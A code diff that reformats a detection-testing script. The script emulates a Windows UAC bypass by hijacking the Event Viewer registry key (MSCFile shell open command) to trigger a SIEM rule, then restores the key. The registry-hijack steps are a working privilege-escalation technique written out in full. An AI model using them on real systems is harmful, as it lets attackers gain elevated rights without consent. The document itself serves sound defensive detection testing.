@@ -15,8 +15,13 @@ from . import common
 
 PLATFORMS = [common.WINDOWS]
 TRIGGERED_RULES = {
-    "SIEM": [{"rule_id": "31b4c719-f2b4-41f6-a9bd-fce93c2eaf62", "rule_name": "Bypass UAC via Event Viewer"}],
-    "ENDPOINT": []
+    "SIEM": [
+        {
+            "rule_id": "31b4c719-f2b4-41f6-a9bd-fce93c2eaf62",
+            "rule_name": "Bypass UAC via Event Viewer",
+        }
+    ],
+    "ENDPOINT": [],
 }
 TACTICS = []
 RTA_ID = "1185afa2-49aa-4cca-8702-228d238c0bd5"
@@ -32,7 +37,9 @@ def main(target_file=common.get_path("bin", "myapp.exe")):
     common.log("Bypass UAC with %s" % target_file)
 
     common.log("Writing registry key")
-    hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command")
+    hkey = winreg.CreateKey(
+        winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command"
+    )
     winreg.SetValue(hkey, "", winreg.REG_SZ, target_file)
 
     common.log("Running event viewer")
@@ -40,7 +47,7 @@ def main(target_file=common.get_path("bin", "myapp.exe")):
 
     time.sleep(3)
     common.log("Killing MMC", log_type="!")
-    common.execute(['taskkill', '/f', '/im', 'mmc.exe'])
+    common.execute(["taskkill", "/f", "/im", "mmc.exe"])
 
     common.log("Restoring registry key", log_type="-")
     winreg.DeleteValue(hkey, "")
